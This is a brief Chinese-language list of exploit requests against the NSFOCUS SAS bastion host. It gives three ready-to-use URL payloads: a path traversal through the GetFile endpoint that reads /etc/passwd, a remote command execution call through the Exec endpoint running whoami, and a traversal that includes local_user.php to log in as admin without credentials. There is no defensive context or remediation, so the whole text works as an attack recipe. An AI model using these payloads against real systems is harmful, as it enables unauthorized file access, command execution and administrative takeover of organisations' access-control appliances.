## 绿盟 SAS堡垒机 GetFile 任意文件读取漏洞
  通过漏洞包含 www/local_user.php 实现任意⽤户登录

```
/webconf/GetFile/index?path=../../../../../../../../../../../../../../etc/passwd
```

## 绿盟 SAS堡垒机 Exec 远程命令执行漏洞

```
/webconf/Exec/index?cmd=whoami
```

## 绿盟 SAS堡垒机 local_user.php 任意用户登录漏洞

```
/api/virtual/home/status?cat=../../../../../../../../../../../../../../usr/local/nsfocus/web/apache2/www/local_user.php&method=login&user_account=admin
```
